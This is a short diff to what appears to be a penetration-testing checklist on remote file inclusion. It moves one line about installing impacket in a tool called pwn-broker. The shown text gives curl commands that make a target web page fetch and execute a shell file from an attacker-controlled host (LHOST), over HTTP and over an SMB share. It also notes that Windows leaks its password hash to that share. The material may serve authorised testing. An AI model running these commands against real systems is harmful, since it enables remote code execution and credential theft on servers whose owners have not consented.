@@ -66,7 +66,8 @@ python3 -m http.server 80
 curl -sk "<Scheme>://<WebHost>/THE-PAGE?<Param>=http://<LHOST>/shell.txt&cmd=id"
 - [ ] A GET /shell.txt in the server's log proves it, even with nothing on the page
 - [ ] The app adds .php: the URL ended with %3F, so the .php becomes a query string
-Windows reaches an SMB share the same way, and sends its hash with it. At the pwn-broker prompt: tool install impacket.
+At the pwn-broker prompt: tool install impacket.
+Windows reaches an SMB share the same way, and sends its hash with it:
 sudo /opt/pwn-broker/bin/impacket-smbserver share "$(pwd)" -smb2support
 - [ ] The full path with sudo: a bare sudo impacket-smbserver does not use pwn-broker's bin folder
 curl -sk "<Scheme>://<WebHost>/THE-PAGE?<Param>=\\\\<LHOST>\\share\\shell.txt&cmd=whoami"
